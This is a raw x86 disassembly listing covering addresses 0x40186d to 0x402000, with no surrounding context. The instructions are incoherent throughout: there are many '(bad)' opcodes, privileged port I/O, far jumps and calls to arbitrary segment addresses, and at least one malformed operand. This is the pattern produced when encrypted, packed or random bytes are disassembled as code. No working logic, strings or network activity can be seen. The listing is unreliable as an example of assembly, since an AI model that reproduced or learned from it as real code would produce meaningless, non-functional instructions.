  40186d:	jbe    0x40186a
  40186f:	(bad)
  401873:	rcr    BYTE PTR [ebp-0x54],1
  401876:	mov    ds,WORD PTR [edi-0x268e3367]
  40187c:	loop   0x4018da
  40187e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40187f:	fsub   st,st(1)
  401881:	jmp    0x5eaf:0x6add6b26
  401888:	push   esp
  401889:	push   ds
  40188a:	jne    0x4018a3
  40188c:	mov    al,ds:0xcc207459
  401891:	adc    dh,bl
  401893:	loopne 0x401864
  401895:	inc    esp
  401896:	retf   0xaa91
  401899:	or     al,ah
  40189b:	pop    esi
  40189c:	sar    DWORD PTR [edx-0x6a],cl
  40189f:	repz xlat BYTE PTR ds:[ebx]
  4018a1:	retf   
  4018a2:	xchg   esi,eax
  4018a3:	fcomip st,st(7)
  4018a5:	xchg   ecx,eax
  4018a6:	scas   al,BYTE PTR es:[edi]
  4018a7:	inc    eax
  4018a8:	out    dx,eax
  4018a9:	push   es
  4018aa:	pop    ds
  4018ab:	inc    ebp
  4018ac:	inc    edi
  4018ad:	cmc    
  4018ae:	jmp    0x7b6735c6
  4018b3:	int3   
  4018b4:	lea    ecx,[edx+0xf7acfe2]
  4018ba:	jo     0x4018aa
  4018bc:	adc    ebx,DWORD PTR [esi+0x72]
  4018bf:	cmc    
  4018c0:	fstp   DWORD PTR gs:[eax-0x4]
  4018c4:	sbb    eax,0xca5fca80
  4018c9:	add    al,0xee
  4018cb:	in     eax,0xba
  4018cd:	dec    edx
  4018ce:	repz jecxz 0x401862
  4018d1:	xchg   DWORD PTR [edx+ecx*1-0x15],ecx
  4018d5:	jne    0x40190b
  4018d7:	pop    esi
  4018d8:	inc    eax
  4018d9:	(bad)  
  4018da:	(bad)  [eax+eax*2]
  4018dd:	sbb    DWORD PTR [eax-0xe],ebx
  4018e0:	cmc    
  4018e1:	jg     0x4018a4
  4018e3:	xchg   ecx,eax
  4018e4:	sub    BYTE PTR [ecx+0x76],dh
  4018e7:	outs   dx,DWORD PTR ds:[esi]
  4018e8:	jb     0x4018cc
  4018ea:	cmp    DWORD PTR [esp+ecx*8-0x25],ecx
  4018ee:	mov    dl,BYTE PTR [edx+0x78f1cfbd]
  4018f4:	mov    ebx,DWORD PTR [esi]
  4018f6:	push   esi
  4018f7:	in     al,0x43
  4018f9:	xlat   BYTE PTR ds:[ebx]
  4018fa:	dec    esi
  4018fb:	bound  edi,QWORD PTR [ebp+0x69500a58]
  401901:	mov    ch,0xd
  401903:	mov    ds:0xf3106bf2,eax
  401908:	xchg   edx,eax
  401909:	mov    ecx,0x1c9b0172
  40190e:	bound  edi,QWORD PTR [ebp-0x38]
  401911:	lahf   
  401912:	jne    0x4018a6
  401914:	mov    BYTE PTR [eax+0x390c91a1],al
  40191a:	cdq    
  40191b:	int3   
  40191c:	dec    ebx
  40191d:	gs scas eax,DWORD PTR es:[edi]
  40191f:	xchg   ebp,eax
  401920:	inc    edx
  401921:	aam    0x3
  401923:	fcmovu st,st(7)
  401925:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401926:	mov    ebx,0x23304a47
  40192b:	fbld   TBYTE PTR [ebp-0x43974b8a]
  401931:	sbb    edx,DWORD PTR [edi]
  401933:	dec    esi
  401934:	dec    ecx
  401935:	mov    al,ds:0xf60d15ca
  40193a:	push   ebp
  40193b:	pop    esp
  40193c:	xor    cl,BYTE PTR [ebx+0x42]
  40193f:	imul   ebx,DWORD PTR [eax+0x58709f0d],0xffffffff
  401946:	popa   
  401947:	test   BYTE PTR [edx],ah
  401949:	xchg   edi,eax
  40194a:	je     0x401929
  40194c:	sub    ch,BYTE PTR [edx+0x5f]
  40194f:	xchg   ecx,eax
  401950:	int3   
  401951:	ins    BYTE PTR es:[edi],dx
  401952:	jle    0x4019cc
  401954:	jae    0x40199d
  401956:	je     0x401978
  401958:	xchg   ebx,eax
  401959:	mov    al,0x7a
  40195b:	add    dl,bh
  40195d:	pop    ss
  40195e:	icebp  
  40195f:	sahf   
  401960:	sub    BYTE PTR [edi+0x3d],al
  401963:	arpl   WORD PTR [esi+edx*4],di
  401966:	lds    edx,FWORD PTR [edx-0x35]
  401969:	retf   0x9693
  40196c:	repnz repz mov al,ds:0x23e709b6
  401973:	mov    eax,edx
  401975:	stos   DWORD PTR es:[edi],eax
  401976:	imul   eax,DWORD PTR [ecx],0xab5b3aa6
  40197c:	lahf   
  40197d:	push   esi
  40197e:	dec    esp
  40197f:	and    eax,ebp
  401981:	les    esi,FWORD PTR [ecx]
  401983:	std    
  401984:	jmp    0x3bb27a9b
  401989:	and    edx,esp
  40198b:	push   ebx
  40198c:	mov    edi,0x3e601840
  401991:	and    BYTE PTR [ebp+0x4b],al
  401994:	push   ecx
  401995:	sbb    ebx,DWORD PTR [esi-0x46]
  401998:	popa   
  401999:	aam    0xd
  40199b:	dec    edx
  40199c:	xchg   DWORD PTR [edi],ecx
  40199e:	(bad)  
  40199f:	xor    eax,0x956a5e97
  4019a4:	or     DWORD PTR [edx+0x9d95060],esp
  4019aa:	stos   DWORD PTR es:[edi],eax
  4019ab:	ins    BYTE PTR es:[edi],dx
  4019ac:	sbb    dl,BYTE PTR [ecx+edi*2]
  4019af:	ret    0x3c27
  4019b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019b4:	nop
  4019b5:	lods   eax,DWORD PTR ds:[esi]
  4019b6:	and    ebp,DWORD PTR [eax]
  4019b8:	stos   BYTE PTR es:[edi],al
  4019b9:	bound  eax,QWORD PTR [ecx]
  4019bb:	popf   
  4019bc:	mov    WORD PTR [eax],cs
  4019be:	cld    
  4019bf:	ret    0x8905
  4019c2:	adc    al,0x4a
  4019c4:	adc    cl,BYTE PTR [esi+0x64]
  4019c7:	dec    esi
  4019c8:	call   FWORD PTR [ebx]
  4019ca:	cmp    ecx,ecx
  4019cc:	icebp  
  4019cd:	ret    0x8175
  4019d0:	dec    eax
  4019d1:	enter  0xb9d2,0x7f
  4019d5:	xor    eax,0x94c1880
  4019da:	mov    cl,0x23
  4019dc:	mov    cl,0xed
  4019de:	int3   
  4019df:	push   0x57
  4019e1:	sub    al,0x4b
  4019e3:	test   eax,0x819209df
  4019e8:	and    eax,0x37dacc4
  4019ed:	push   edx
  4019ee:	adc    DWORD PTR [eax-0x48d7952],ebp
  4019f4:	mov    cl,0x77
  4019f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019f7:	xor    al,0x0
  4019f9:	fwait
  4019fa:	out    0x61,eax
  4019fc:	ss jo  0x401a28
  4019ff:	add    eax,0x3598004e
  401a04:	xor    esp,edx
  401a06:	dec    eax
  401a07:	xor    BYTE PTR ds:0x51a04e6a,dh
  401a0d:	inc    ebx
  401a0e:	pop    edx
  401a0f:	repz mov al,ds:0x865c4d7f
  401a15:	lea    ebp,[ebx+0x4fbdf0d7]
  401a1b:	lea    eax,[eax]
  401a1d:	add    DWORD PTR [edi],esp
  401a1f:	inc    esp
  401a20:	ja     0x401a3d
  401a22:	and    DWORD PTR [edx],esp
  401a24:	jno    0x4019a7
  401a26:	pushf  
  401a27:	add    dh,bl
  401a29:	retf   0x58e0
  401a2c:	cmc    
  401a2d:	(bad)  
  401a2e:	jno    0x401a83
  401a30:	xchg   BYTE PTR ds:0xdb9a9659,al
  401a36:	test   BYTE PTR [eax],bl
  401a38:	in     eax,0x4b
  401a3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a3b:	pusha  
  401a3c:	sbb    al,0x33
  401a3e:	in     al,dx
  401a3f:	push   edi
  401a40:	test   eax,0xa925fda8
  401a45:	imul   esp
  401a47:	cs aad 0x45
  401a4a:	repnz push cs
  401a4c:	retf   0x636b
  401a4f:	sbb    DWORD PTR [eax],0x5f
  401a52:	add    DWORD PTR [edi+eax*8-0x449c8169],eax
  401a59:	pop    ebx
  401a5a:	push   cs
  401a5b:	and    DWORD PTR [edx],edi
  401a5d:	sbb    al,BYTE PTR [edx+0x1b]
  401a60:	adc    ebp,DWORD PTR [ecx-0x60b7ef9b]
  401a66:	pop    es
  401a67:	xchg   ebx,eax
  401a68:	push   cs
  401a69:	and    eax,0x63c4a6a6
  401a6e:	dec    ebx
  401a6f:	pop    edx
  401a70:	inc    esi
  401a71:	and    al,0xbc
  401a73:	mov    dl,0x22
  401a75:	add    BYTE PTR [eax],0x24
  401a78:	icebp  
  401a79:	jle    0x401a01
  401a7b:	imul   edx,DWORD PTR [ebp-0x529c3966],0x5d
  401a82:	jmp    0x401ab1
  401a84:	jb     0x401ab2
  401a86:	rol    DWORD PTR [esi-0x487dc458],1
  401a8c:	push   edi
  401a8d:	not    eax
  401a8f:	jecxz  0x401a39
  401a91:	cmp    ch,BYTE PTR [edx+0x7b7fe3b5]
  401a97:	test   cl,ah
  401a99:	addr16 push cs
  401a9b:	xor    dl,BYTE PTR [eax]
  401a9d:	into   
  401a9e:	adc    DWORD PTR [ecx],0xffffff8b
  401aa1:	sbb    BYTE PTR [esi-0x479264fe],cl
  401aa7:	inc    edx
  401aa8:	or     DWORD PTR [esi],esp
  401aaa:	mov    ds:0xb9a3f956,al
  401aaf:	sbb    ecx,ecx
  401ab1:	xor    eax,ecx
  401ab3:	cmp    DWORD PTR [eax+0xe],edx
  401ab6:	pop    ecx
  401ab7:	rcr    DWORD PTR ds:0xd9a4b5d2,0x88
  401abe:	(bad)  
  401abf:	mov    edx,0x85374458
  401ac4:	mov    eax,edi
  401ac6:	mov    ecx,0x9b006601
  401acb:	xor    edi,DWORD PTR [edi]
  401acd:	enter  0x31cf,0xa0
  401ad1:	mov    ecx,0x2f98a36c
  401ad6:	mov    ecx,0xb448460e
  401adb:	stos   BYTE PTR es:[edi],al
  401adc:	clc    
  401add:	adc    eax,0xaa373479
  401ae2:	ss xor eax,0x9a2f667f
  401ae8:	jmp    0x401a86
  401aea:	or     dh,BYTE PTR [edi+0x15]
  401aed:	das    
  401aee:	loop   0x401b66
  401af0:	imul   ebx,ebx,0xffffffe7
  401af3:	addr16 mov eax,cs:0x5364
  401af8:	cdq    
  401af9:	push   0x68
  401afb:	xchg   edx,eax
  401afc:	sub    DWORD PTR [ebp+0x51],edi
  401aff:	xchg   edi,eax
  401b00:	jo     0x401b60
  401b02:	adc    eax,0x7ba76d38
  401b07:	xor    edx,DWORD PTR [ebx]
  401b09:	lahf   
  401b0a:	mov    dl,0x80
  401b0c:	lock jge 0x401ac4
  401b0f:	arpl   WORD PTR [edi+0x5e],di
  401b12:	pop    ss
  401b13:	push   edi
  401b14:	push   eax
  401b15:	(bad)  
  401b16:	xor    DWORD PTR [ebx-0x510c5f99],ebx
  401b1c:	jne    0x401ac6
  401b1e:	iret   
  401b1f:	sbb    eax,eax
  401b21:	rol    edi,cl
  401b23:	fsub   QWORD PTR [edx-0x48]
  401b26:	fs xor eax,0x7d91b495
  401b2c:	lea    edx,[edi-0x33]
  401b2f:	mov    dh,BYTE PTR [esi]
  401b31:	add    al,0x1a
  401b33:	imul   edi,eax,0xffffffa0
  401b36:	lods   eax,DWORD PTR ds:[esi]
  401b37:	mov    ds:0x45fa2738,eax
  401b3c:	sbb    al,BYTE PTR [edi-0x38b8971d]
  401b42:	adc    al,0xb
  401b44:	pushf  
  401b45:	inc    esp
  401b46:	mov    eax,0x52bc7bad
  401b4b:	xchg   ebp,eax
  401b4c:	js     0x401b9e
  401b4e:	mov    bl,0x29
  401b50:	dec    ebp
  401b51:	mov    ds:0x4380e036,al
  401b56:	jmp    0x6ed5:0x9f740702
  401b5d:	mov    al,ds:0x94bc9687
  401b62:	push   esp
  401b63:	adc    eax,0x780e0363
  401b68:	xchg   ebp,eax
  401b69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b6a:	in     al,dx
  401b6b:	mov    edi,0xaf5ced58
  401b70:	mov    cl,0xd3
  401b72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b73:	and    edx,ebp
  401b75:	sbb    DWORD PTR [edx+0x68],0x75
  401b79:	and    bl,BYTE PTR [ecx-0x3c144ddb]
  401b7f:	mov    esp,0x5e74530d
  401b84:	pusha  
  401b85:	stos   BYTE PTR es:[edi],al
  401b86:	popa   
  401b87:	push   edi
  401b88:	or     edi,ecx
  401b8a:	out    dx,al
  401b8b:	es repz gs repz sbb eax,0xc5a126a5
  401b94:	dec    eax
  401b95:	or     eax,0x9b08db12
  401b9a:	mov    BYTE PTR [edx],bh
  401b9c:	mov    cl,BYTE PTR [edi-0x6bad9ed1]
  401ba2:	push   ds
  401ba3:	in     eax,dx
  401ba4:	hlt    
  401ba5:	and    eax,0x309aa2f6
  401baa:	jle    0x401b62
  401bac:	out    0x16,eax
  401bae:	dec    edx
  401baf:	jne    0x401b81
  401bb1:	daa    
  401bb2:	lahf   
  401bb3:	dec    ecx
  401bb4:	shl    BYTE PTR [eax-0x7d],cl
  401bb7:	test   al,0xc
  401bb9:	cmp    eax,0xe5c0760f
  401bbe:	ins    BYTE PTR es:[edi],dx
  401bbf:	mov    WORD PTR [edx+0x56ee008c],gs
  401bc5:	push   eax
  401bc6:	sar    DWORD PTR [ecx-0x7e],cl
  401bc9:	js     0x401c2b
  401bcb:	dec    si
  401bcd:	imul   ebx,esi,0x532f642
  401bd3:	mov    ebx,0x73cffbc1
  401bd8:	outs   dx,BYTE PTR ds:[esi]
  401bd9:	cmp    al,0xf6
  401bdb:	outs   dx,DWORD PTR ds:[esi]
  401bdc:	or     DWORD PTR [esi+0x57a5ee79],eax
  401be2:	mov    dl,0x12
  401be4:	clc    
  401be5:	fiadd  WORD PTR [eax]
  401be7:	out    0xad,al
  401be9:	loope  0x401c42
  401beb:	in     al,0x81
  401bed:	cmp    al,0xea
  401bef:	ficomp WORD PTR [esi]
  401bf1:	ret    
  401bf2:	or     eax,0x7a2cb238
  401bf7:	shr    edi,cl
  401bf9:	xor    al,0xe2
  401bfb:	inc    ebx
  401bfc:	mov    dl,0xd4
  401bfe:	psubsw mm6,QWORD PTR [esi-0x6a066e35]
  401c05:	push   0xdb609e31
  401c0a:	ja     0x401bc9
  401c0c:	in     al,dx
  401c0d:	sti    
  401c0e:	mov    dh,0x31
  401c10:	(bad)  
  401c12:	and    eax,0x4eb8c52f
  401c17:	add    BYTE PTR [edi],bh
  401c19:	or     eax,0xe9495780
  401c1e:	std    
  401c1f:	ror    bh,cl
  401c21:	jbe    0x401bfa
  401c23:	adc    BYTE PTR [eiz*4+0x1ad04adc],0x74
  401c2b:	xchg   esi,eax
  401c2c:	aam    0x15
  401c2e:	xchg   ecx,eax
  401c2f:	inc    ebp
  401c30:	sub    eax,0xa1d306e4
  401c35:	imul   esi,DWORD PTR [ebx-0x58463310],0xcf2a2f57
  401c3f:	pop    esp
  401c40:	int    0xec
  401c42:	jo     0x401c42
  401c44:	outs   dx,BYTE PTR ds:[esi]
  401c45:	in     al,dx
  401c46:	(bad)  
  401c47:	sbb    eax,DWORD PTR [edi-0x7d598d0b]
  401c4d:	mov    eax,ebx
  401c4f:	mov    ecx,0x1ae1f30f
  401c54:	pop    ebp
  401c55:	mov    al,ds:0x4c3d0289
  401c5a:	mov    bh,0xf3
  401c5c:	sti    
  401c5d:	es daa 
  401c5f:	lds    ebp,FWORD PTR [edi-0x7e]
  401c62:	mov    ds:0x42be3898,al
  401c67:	add    cl,BYTE PTR [edx]
  401c69:	(bad)  
  401c6a:	jle    0x401c8b
  401c6c:	mov    dh,0x7c
  401c6e:	test   cl,bh
  401c70:	pop    ds
  401c71:	adc    BYTE PTR [ebp-0x55],dl
  401c74:	cmp    DWORD PTR [esi-0x9429e20],esp
  401c7a:	aad    0x6
  401c7c:	mov    edi,0xc856f4b1
  401c81:	rcr    DWORD PTR [edx],1
  401c83:	bound  ebx,QWORD PTR [esi]
  401c85:	loopne 0x401c5a
  401c87:	pop    edi
  401c88:	sbb    ecx,DWORD PTR [eax+0x21bacdf2]
  401c8e:	cmp    eax,0x3605f200
  401c93:	stc    
  401c94:	pushf  
  401c95:	xchg   esp,eax
  401c96:	into   
  401c97:	xchg   ebp,eax
  401c98:	test   BYTE PTR [ebp+0x4f],0xd
  401c9c:	je     0x401d01
  401c9e:	push   ss
  401c9f:	mov    esp,0x7677766e
  401ca4:	inc    edi
  401ca5:	call   0xf0bf:0x383e13f5
  401cac:	push   cs
  401cad:	sbb    al,0x77
  401caf:	and    DWORD PTR [edx],ecx
  401cb1:	mov    al,dh
  401cb3:	aad    0x94
  401cb5:	sub    eax,esi
  401cb7:	scas   eax,DWORD PTR es:[edi]
  401cb8:	(bad)  
  401cb9:	cmc    
  401cba:	je     0x401d25
  401cbc:	mul    BYTE PTR [eax+0x1ed18189]
  401cc2:	cmp    DWORD PTR [esi+0x7f57461f],edi
  401cc8:	xor    DWORD PTR [edx+0x54],ebx
  401ccb:	sub    eax,0xb1c22bce
  401cd0:	ror    eax,0x55
  401cd3:	lods   eax,DWORD PTR ds:[esi]
  401cd4:	or     eax,0x702a33ad
  401cd9:	add    eax,0xc6553777
  401cde:	add    eax,0x9c3a14af
  401ce3:	xchg   edx,eax
  401ce4:	arpl   WORD PTR [edx-0x7],bp
  401ce7:	popf   
  401ce8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ce9:	xlat   BYTE PTR ds:[ebx]
  401cea:	sbb    al,0x1f
  401cec:	xchg   edx,eax
  401ced:	clc    
  401cee:	cmp    al,0xc3
  401cf0:	mul    DWORD PTR [edi+0x76db9381]
  401cf6:	outs   dx,DWORD PTR ds:[esi]
  401cf7:	out    0x8a,eax
  401cf9:	mov    cl,0x58
  401cfb:	dec    eax
  401cfc:	(bad)  
  401cfd:	push   esi
  401cfe:	lahf   
  401cff:	outs   dx,BYTE PTR ds:[esi]
  401d00:	sbb    BYTE PTR [esi-0x29],al
  401d03:	call   0xb398:0x437e80a4
  401d0a:	push   esp
  401d0b:	push   0x8
  401d0d:	sub    eax,0x33bdd77c
  401d12:	push   eax
  401d13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d14:	sbb    eax,0xa3b0d7bb
  401d19:	adc    BYTE PTR cs:[eax+0x6e],dl
  401d1d:	pop    ss
  401d1e:	inc    ebx
  401d1f:	inc    ecx
  401d20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d21:	fisttp DWORD PTR [esi]
  401d23:	(bad)  
  401d24:	pushf  
  401d25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d26:	fwait
  401d27:	sbb    DWORD PTR [edi+0x1a],0x53cbe7e6
  401d2e:	out    0xc3,al
  401d30:	push   0x1c
  401d32:	dec    ecx
  401d33:	dec    ebp
  401d34:	xchg   edi,eax
  401d35:	and    bh,BYTE PTR [ebp+0x2290a1b1]
  401d3b:	push   0x3c504954
  401d40:	and    edi,esp
  401d42:	mov    ch,0x8
  401d44:	adc    edi,ecx
  401d46:	call   0xd25f5b8c
  401d4b:	jg     0x401d1b
  401d4d:	int3   
  401d4e:	jg     0x401d3c
  401d50:	xlat   BYTE PTR ds:[ebx]
  401d51:	add    DWORD PTR [si-0x8],ebx
  401d55:	pop    DWORD PTR [edi-0x201f54af]
  401d5b:	clc    
  401d5c:	jecxz  0x401d16
  401d5e:	fwait
  401d5f:	pop    ebx
  401d60:	mov    al,ds:0x3e463081
  401d65:	js     0x401da0
  401d67:	push   ss
  401d68:	test   eax,0xaf9a2fa
  401d6d:	outs   dx,BYTE PTR ds:[esi]
  401d6e:	gs mov edx,0x1d6df3ae
  401d74:	push   es
  401d75:	push   es
  401d76:	sbb    al,0x22
  401d78:	(bad)  [edx+0x6e]
  401d7b:	pop    ds
  401d7c:	sbb    edx,DWORD PTR [edx]
  401d7e:	fs dec ebx
  401d80:	loope  0x401da8
  401d82:	retf   
  401d83:	test   DWORD PTR [ecx-0x15],ebp
  401d86:	std    
  401d87:	out    0xfc,eax
  401d89:	(bad)  
  401d8a:	sub    eax,0x6cc86d0c
  401d8f:	sbb    al,0xde
  401d91:	dec    eax
  401d92:	jl     0x401d27
  401d94:	stos   BYTE PTR es:[edi],al
  401d95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d96:	push   0x2781e14
  401d9b:	fsub   DWORD PTR [ebx]
  401d9d:	inc    edx
  401d9e:	hlt    
  401d9f:	add    eax,0xba6c2e3f
  401da4:	cmp    DWORD PTR [edi-0x1bbe0c1d],ebp
  401daa:	add    BYTE PTR [eax],0xf3
  401dad:	adc    DWORD PTR [edi],eax
  401daf:	sub    al,0x11
  401db1:	fadd   DWORD PTR [esi-0x390674f2]
  401db7:	xchg   sp,ax
  401db9:	fnstenv [esi-0x4ab60044]
  401dbf:	sub    ah,dl
  401dc1:	jno    0x401e39
  401dc3:	fst    st(5)
  401dc5:	pop    es
  401dc6:	add    al,0xcf
  401dc8:	test   al,bl
  401dca:	ds jne 0x401e11
  401dcd:	aam    0x85
  401dcf:	pop    ebx
  401dd0:	adc    ebp,esi
  401dd2:	aad    0x1a
  401dd4:	ins    DWORD PTR es:[edi],dx
  401dd5:	mov    dh,0xc4
  401dd7:	aaa    
  401dd8:	shr    DWORD PTR [edx+0x71792fe4],cl
  401dde:	loopne 0x401dd2
  401de0:	fadd   DWORD PTR [ebp+0x7f]
  401de3:	cmc    
  401de4:	pop    esp
  401de5:	xchg   ebx,eax
  401de6:	jmp    0x25a59fe4
  401deb:	retf   0x1a90
  401dee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401def:	sti    
  401df0:	sub    bl,BYTE PTR ds:0x359a972d
  401df6:	pop    ebx
  401df7:	jae    0x401d96
  401df9:	(bad)  
  401dfb:	stos   DWORD PTR es:[edi],eax
  401dfc:	mov    edi,cs
  401dfe:	xchg   ecx,eax
  401dff:	rol    DWORD PTR [esi],cl
  401e01:	aas    
  401e02:	jns    0x401e18
  401e04:	lock mov ebp,0x902cd77b
  401e0a:	xor    eax,0x7f7edf76
  401e0f:	call   0xd2ee8c8
  401e14:	call   0x528e:0x867123f0
  401e1b:	rol    DWORD PTR [ecx+0x6688c04f],cl
  401e21:	in     eax,0x6f
  401e23:	retf   
  401e24:	stos   BYTE PTR es:[edi],al
  401e25:	pop    ss
  401e26:	stos   BYTE PTR es:[edi],al
  401e27:	xor    eax,0x8ed9c964
  401e2c:	out    dx,eax
  401e2d:	xchg   ebp,eax
  401e2e:	sub    eax,0xcad100d8
  401e33:	fcomp  DWORD PTR ds:0x8bb6d27b
  401e39:	jno    0x401e1c
  401e3b:	xchg   edx,edi
  401e3d:	fadd   st,st(0)
  401e3f:	mov    DWORD PTR [ebp-0x1f],ecx
  401e42:	jmp    0xe8e5ccf4
  401e47:	(bad)  [edx]
  401e49:	rcr    BYTE PTR [edi+esi*1-0x28c18180],1
  401e50:	out    dx,eax
  401e51:	mov    dh,0x94
  401e53:	imul   edi,DWORD PTR [edi-0x5efb4dd4],0x11
  401e5a:	imul   esi,edi,0x48
  401e5d:	cmc    
  401e5e:	or     BYTE PTR [edi],al
  401e60:	mov    ?,WORD PTR [ebx+0x49]
  401e63:	sub    al,0x5d
  401e65:	or     eax,0xd695807d
  401e6a:	push   es
  401e6b:	fistp  DWORD PTR [ebp-0x6cb42bab]
  401e71:	jg     0x401ea7
  401e73:	outs   dx,DWORD PTR ds:[esi]
  401e74:	stos   DWORD PTR es:[edi],eax
  401e75:	adc    ah,BYTE PTR [ecx-0x46]
  401e78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e79:	or     al,0x57
  401e7b:	push   ebp
  401e7c:	jge    0x401e7a
  401e7e:	sub    eax,0x47e89705
  401e83:	jb     0x401ec2
  401e85:	pop    ebp
  401e86:	fcom   DWORD PTR [ecx+0x1bd30e80]
  401e8c:	jns    0x401ec9
  401e8e:	fdivr  QWORD PTR [esi]
  401e90:	push   eax
  401e91:	mov    dl,0xbe
  401e93:	sub    ebp,DWORD PTR [ebx-0x194aa5a6]
  401e99:	cld    
  401e9a:	daa    
  401e9b:	push   esp
  401e9c:	lock sbb al,0xd7
  401e9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ea0:	pushf  
  401ea1:	push   esp
  401ea3:	(bad)  
  401ea5:	mov    bl,cl
  401ea7:	std    
  401ea8:	int3   
  401ea9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401eaa:	xchg   edi,eax
  401eab:	pop    ebx
  401eac:	and    BYTE PTR [edx],bh
  401eae:	clc    
  401eaf:	push   0x73
  401eb1:	cmp    al,0x56
  401eb3:	mov    BYTE PTR [ebx+esi*2],dl
  401eb6:	jbe    0x401ef2
  401eb8:	mov    eax,0x14a221c2
  401ebd:	mov    esp,0x7e17b6ad
  401ec2:	mov    edx,0x38f82f7e
  401ec7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ec8:	push   0xffffffdf
  401eca:	jle    0x401f46
  401ecc:	xchg   ecx,eax
  401ecd:	mov    dl,0xd2
  401ecf:	jl     0x401e8a
  401ed1:	shr    bh,0xff
  401ed4:	or     BYTE PTR [eax],dl
  401ed6:	std    
  401ed7:	and    al,0x76
  401ed9:	cmp    eax,0xe77da3e6
  401ede:	aas    
  401edf:	pop    edx
  401ee0:	je     0x401e9f
  401ee2:	pusha  
  401ee3:	mov    BYTE PTR [ebx+eax*1-0x505e4b02],0xf4
  401eeb:	fwait
  401eec:	scas   al,BYTE PTR es:[edi]
  401eed:	xchg   esi,eax
  401eee:	pushf  
  401eef:	fcom   DWORD PTR [esi]
  401ef1:	pop    edx
  401ef2:	outs   dx,BYTE PTR ds:[esi]
  401ef3:	dec    ecx
  401ef4:	inc    eax
  401ef5:	(bad)  
  401ef7:	fisttp DWORD PTR [edx-0x25]
  401efa:	outs   dx,DWORD PTR ds:[esi]
  401efb:	push   ebp
  401efc:	call   0xb65c:0x9de0ddbf
  401f03:	mov    dh,0x8b
  401f05:	imul   ebp,DWORD PTR ds:[ecx-0xf8446cd],0xffffffe6
  401f0d:	push   ss
  401f0e:	dec    esi
  401f0f:	push   esi
  401f10:	outs   dx,DWORD PTR ds:[esi]
  401f11:	fwait
  401f12:	inc    eax
  401f13:	mov    edx,0x643066de
  401f18:	cmc    
  401f19:	mov    ch,0x1e
  401f1b:	pop    esp
  401f1c:	cs mov esi,ebx
  401f1f:	aaa    
  401f20:	xor    al,0x41
  401f22:	fld    TBYTE PTR [eax-0x3290aa05]
  401f28:	cmp    ch,0x73
  401f2b:	jmp    FWORD PTR [esi]
  401f2d:	mov    eax,0x7857a356
  401f32:	leave  
  401f33:	daa    
  401f34:	and    DWORD PTR [eax-0x58c574ac],ecx
  401f3a:	ja     0x401f2a
  401f3c:	in     al,dx
  401f3d:	jmp    0x401f94
  401f3f:	mov    edi,0x8fbfbf8c
  401f44:	in     al,dx
  401f45:	sub    al,0xbc
  401f47:	add    ebx,0xd2bd757e
  401f4d:	mov    esp,0x9f830172
  401f52:	clc    
  401f53:	sub    ebp,0xffffffe9
  401f56:	adc    dh,BYTE PTR es:[bx+0x4]
  401f5b:	aas    
  401f5c:	loopne 0x401f90
  401f5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f5f:	mul    DWORD PTR [eax]
  401f61:	loop   0x401f4c
  401f63:	mov    dh,0x48
  401f65:	inc    edx
  401f66:	push   ss
  401f67:	dec    esp
  401f68:	arpl   WORD PTR [ecx-0x47884521],cx
  401f6e:	and    esi,DWORD PTR [ebp+0xd500779]
  401f74:	ret    0x8c44
  401f77:	and    ebx,edx
  401f79:	jecxz  0x401fcb
  401f7b:	stos   DWORD PTR es:[edi],eax
  401f7c:	jb     0x401ff1
  401f7e:	test   DWORD PTR [ebx],ebp
  401f80:	mov    DWORD PTR [ebx],esi
  401f82:	and    ebp,DWORD PTR [esp+edi*2]
  401f85:	sti    
  401f86:	loope  0x401fa5
  401f88:	fbld   TBYTE PTR [esi]
  401f8a:	cmp    DWORD PTR [ecx+eax*4-0x78d5ae2d],ebx
  401f91:	fsubr  QWORD PTR [esi-0x7270610b]
  401f97:	iret   
  401f98:	sahf   
  401f99:	jo     0xc88736fe
  401f9f:	push   cs
  401fa0:	leave  
  401fa1:	stos   DWORD PTR es:[edi],eax
  401fa2:	mov    al,ds:0xe7f81d42
  401fa7:	ror    esp,1
  401fa9:	fsubr  QWORD PTR [edx]
  401fab:	sub    esp,DWORD PTR [edx+0x49207701]
  401fb1:	jge    0x40200f
  401fb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fb4:	inc    ebx
  401fb5:	repz cmp edx,DWORD PTR [ecx+0x7b112ed8]
  401fbc:	sbb    DWORD PTR [ebp+0x43],ebp
  401fbf:	out    dx,eax
  401fc0:	loop   0x401f84
  401fc2:	stos   DWORD PTR es:[edi],eax
  401fc3:	jae    0x401ffe
  401fc5:	jnp    0x401fb9
  401fc7:	inc    ecx
  401fc8:	add    BYTE PTR [edx-0x6e],ch
  401fcb:	data16 fist WORD PTR [edx]
  401fce:	call   0x5496:0xa0372637
  401fd5:	push   es
  401fd6:	and    DWORD PTR [esi-0x17678b53],eax
  401fdc:	dec    edx
  401fdd:	push   ebx
  401fde:	out    0x83,al
  401fe0:	cmp    al,ah
  401fe2:	in     al,dx
  401fe3:	inc    esi
  401fe4:	add    eax,ebx
  401fe6:	cli    
  401fe7:	sub    esi,esp
  401fe9:	(bad)  
  401fea:	retf   
  401feb:	jnp    0x402009
  401fed:	call   0x575c619f
  401ff2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ff3:	aaa    
  401ff4:	jmp    0xc975:0x15ca19e
  401ffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ffc:	into   
  401ffd:	gs push ss
  401fff:	icebp  
  402000:	push   ecx
